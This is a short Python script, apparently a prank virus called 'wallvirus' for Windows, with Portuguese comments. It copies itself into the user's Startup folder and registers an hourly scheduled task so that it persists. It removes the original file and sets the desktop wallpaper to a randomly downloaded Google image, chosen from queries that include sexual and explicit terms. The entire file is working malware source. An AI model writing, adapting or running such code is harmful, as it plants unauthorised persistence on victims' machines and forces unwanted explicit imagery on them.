from ctypes import windll
from random import choice
from time import sleep
from google_images_download import google_images_download 
import os
from os.path import join
import sys
import getpass
import subprocess

#queries para serem pesquisadas
search_queries = [     
'bolsonaro heroi',
'bolsonaro otaku',
'naked shrek',
'ahegao',
'ahegao shrek',
'anime body pillow',
'yaoi',
'ecchi',
'never gonna give you up',
'ricardo milos',
'naruto and sasuke love',
'steve and bucky love',
'tobey maguire memes',
'joker dancing'
] 

schedule_cmd = 'SCHTASKS /CREATE /SC HOURLY /MO 2 /TN "wallvirus" /TR '
delete_schedule = 'SCHTASKS /DELETE /TN "wallvirus"'

if(sys.getfilesystemencoding() == 'utf-8'):
	setImageAsBackground = lambda image: windll.user32.SystemParametersInfoW(20, 0, image , 0)
else:
	setImageAsBackground = lambda image: windll.user32.SystemParametersInfoA(20, 0, image , 0)

def GetImg(query_img, outdir, silent = False):
	google = google_images_download.googleimagesdownload()
	
	config_params = {
					"keywords": query_img, 
					"format": 'jpg', #talvez tirar isso
	                "limit": 1, 
	                "print_urls":False, 
	                "size": "medium", 
	                "aspect_ratio": 'panoramic',
	                "output_directory": outdir,
	                "silent_mode": silent,
	                "no_numbering": True,
	                "no_directory": True
	                } 
	tries = 10
	while(tries):
		path = google.download(config_params)
		try:
			path[0][query_img][0]
		except:
			tries-=1
		else:
			return path[0][query_img][0]

	#print(paths[0][query_img][0])
	return None

#montando path para o diretorio de startup
def getStartupDir():
	root_path = "C:\\Users"
	user = getpass.getuser()
	startup_path = "AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
	return join(root_path,user,startup_path)

def copyItself(filename,curdir, outdir):

	#ler proprio conteudo
	self_file = open(join(curdir,filename),'rb')
	content = self_file.read()
	self_file.close()
	
	#mudando diretorio de trabalho para o diretorio de startup
	os.chdir(outdir)

	#copiando conteudo para novo arquivo
	new_file = open(join(outdir,filename),'wb')
	new_file.write(content)
	new_file.close()

	#retorna diretorio de trabalho
	os.chdir(curdir)


#se recebeu algum argumento
if(len(sys.argv)>1):
	#se esse argumento é o arquivo com caminho
	if(os.path.isfile(sys.argv[1])):
		#então remova o arquivo original
		os.remove(sys.argv[1])





filename = sys.argv[0].split('\\')[-1]

startup_full_path = getStartupDir()

current_dir = os.getcwd()

if(current_dir != startup_full_path):
	copyItself(filename, current_dir, startup_full_path)

	# print(schedule_cmd+'"'+join(startup_full_path,filename)+'"')
	responde = subprocess.check_output('SCHTASKS /QUERY')
	if(responde.decode('ISO-8859-1').find('wallvirus') == -1):
		subprocess.call(schedule_cmd+'"'+join(startup_full_path,filename)+'"')

	# responde = subprocess.check_output(schedule_cmd+'"'+join(startup_full_path,filename)+'"')
	# print(responde)
# def setSchedule(sch_name):

img_path = GetImg(choice(search_queries), startup_full_path,silent = True)
if(img_path):
	setImageAsBackground(img_path)
	sleep(2)
	os.remove(img_path)
	# os.system("taskkill /f /im "+ filename)
	# os.remove(filename)